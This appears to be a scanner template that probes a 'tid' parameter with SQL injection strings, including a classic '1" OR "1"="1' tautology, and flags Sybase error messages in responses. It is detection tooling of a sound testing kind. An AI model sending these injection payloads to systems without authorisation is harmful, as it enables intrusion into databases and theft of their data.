id: sqli3-sybase-10
name: 'SQLi sybase prefix #9 in tid'
severity: high
type: active
tags:
  - sqli
  - injection
  - sybase
description: 'Triggers sybase error via tid'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      tid:
        - '''))'
        - '1" OR "1"="1'
    matchers:
      - type: regex
        part: body
        regex:
          - 'Sybase'
          - 'Adaptive Server'
